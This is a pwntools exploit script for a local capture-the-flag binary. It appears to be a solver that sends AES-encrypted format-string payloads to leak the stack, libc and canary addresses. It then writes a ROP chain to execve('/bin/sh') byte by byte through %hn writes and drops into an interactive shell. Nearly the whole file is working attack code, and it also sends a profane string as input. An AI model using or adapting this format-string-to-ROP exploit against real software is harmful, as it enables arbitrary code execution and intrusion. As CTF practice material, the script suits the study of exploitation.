from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
context(log_level = 'debug')

r = process("./pwn", env = {"LD_LIBRARY_PATH": "/home/astra/CTF/Pwn/glibc/compat-glibc-2.31/lib"})

first_debug = 1
debugging = 1
pausing = 1
def debug(*args):
    global first_debug
    if not debugging: return
    if first_debug:
        gdb.attach(r, *args)
        first_debug = 0
    if pausing: pause()

def parse_u64(raw):
    assert len(raw) <= 8
    return u64(raw.ljust(8, b'\0'))

def parse_int(raw):
    tokens = b'box0123456789abcdef'
    ret = ''
    for i in raw:
        if i not in tokens:
            return int(ret, 0)
        else:
            ret += chr(i)
    return int(ret, 0)

key = b'\x7b\xf3\x5c\xd6\x9c\x47\x5d\x5e\x6f\x1d\x7a\x23\x18\x7b\xf9\x34'
cipher = AES.new(key, AES.MODE_ECB)
r.sendlineafter(b'linsir want to know your name\n', b'fuck you')
payload1 = b'%15$p.%6$p.%13$p'
r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload1, 16)))
r.recvuntil(b'your like ')
ret = r.recvline()
success(ret)
main = parse_int(ret) - 243
victim = parse_int(ret.split(b'.')[1])
canary = parse_int(ret.split(b'.')[2])
rsp = victim - 0x138
i_var = rsp + 0x14
libc_base = main - 0x04af90
one_gadget = libc_base + 0x51e02
success('Main: %s' % hex(main))
success('Libc Base: %s' % hex(libc_base))
success('Victim: %s' % hex(victim))
success('Canary: %s' % hex(canary))

payload2 = b'%' + str(i_var & 0xffff).encode() + b'c%6$hn'
r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload2, 16)))
r.recvuntil(b'your like ')
ret = r.recvline()

payload3 = b'%' + str(98).encode() + b'c%45$hn'
r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload3, 16)))
r.recvuntil(b'your like ')
ret = r.recvline()

pop_rdi = libc_base + 0x04ab6a
pop_rsi = libc_base + 0x04d01f
pop_rdx = libc_base + 0x106c12
bin_sh = libc_base + 0x1db5bd
system = libc_base + 0x079290
execve = libc_base + 0x10a170
libc_ret = pop_rdi + 1
zero = 0x100
#bin_sh_str = b'cat /flag'

for i in range(6):
    payload = b'%' + str((rsp + 72 + i) & 0xffff).encode() + b'c%6$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()
    
    payload = b'%' + str(pop_rdi >> i*8 & 0xff).encode() + b'c%45$hhn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()

for i in range(6):
    payload = b'%' + str((rsp + 80 + i) & 0xffff).encode() + b'c%6$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()
    
    payload = b'%' + str(bin_sh >> i*8 & 0xff).encode() + b'c%45$hhn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()

for i in range(6):
    payload = b'%' + str((rsp + 88 + i) & 0xffff).encode() + b'c%6$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()
    
    payload = b'%' + str(pop_rsi >> i*8 & 0xff).encode() + b'c%45$hhn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()

for i in range(8):
    payload = b'%' + str((rsp + 96 + i) & 0xffff).encode() + b'c%6$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()
    
    payload = b'%' + str(zero).encode() + b'c%45$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()

for i in range(6):
    payload = b'%' + str((rsp + 104 + i) & 0xffff).encode() + b'c%6$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()
    
    payload = b'%' + str(pop_rdx >> i*8 & 0xff).encode() + b'c%45$hhn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()

for i in range(8):
    payload = b'%' + str((rsp + 112 + i) & 0xffff).encode() + b'c%6$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()
    
    payload = b'%' + str(zero).encode() + b'c%45$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()

for i in range(6):
    payload = b'%' + str((rsp + 120 + i) & 0xffff).encode() + b'c%6$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()
    
    payload = b'%' + str(execve >> i*8 & 0xff).encode() + b'c%45$hhn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()

for i in range(6,8):
    payload = b'%' + str((rsp + 120 + i) & 0xffff).encode() + b'c%6$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()
    
    payload = b'%' + str(zero).encode() + b'c%45$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()

'''
for i in range(len(bin_sh_str)):
    payload = b'%' + str((bin_sh + i) & 0xffff).encode() + b'c%6$hn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()
    
    payload = b'%' + str(bin_sh_str[i]).encode() + b'c%45$hhn'
    r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
    r.recvuntil(b'your like ')
    ret = r.recvline()

payload = b'%' + str((bin_sh + len(bin_sh_str)) & 0xffff).encode() + b'c%6$hn'
r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
r.recvuntil(b'your like ')
ret = r.recvline()
    
payload = b'%' + str(0x100).encode() + b'c%45$hn'
r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
r.recvuntil(b'your like ')
ret = r.recvline()

for j in range(0xd8, 0xe8, 0x10):
    for i in range(4):
        payload = b'%' + str((rsp + 0xd8 + i*2) & 0xffff).encode() + b'c%6$hn'
        r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
        r.recvuntil(b'your like ')
        ret = r.recvline()
        
        payload = b'%' + str(canary >> i*16 & 0xffff).encode() + b'c%45$hn'
        r.sendlineafter(b'your favourite anime: ', cipher.encrypt(pad(payload, 16)))
        r.recvuntil(b'your like ')
        ret = r.recvline()
'''

#debug('b system')
#debug('b execve')

r.interactive()
r.close()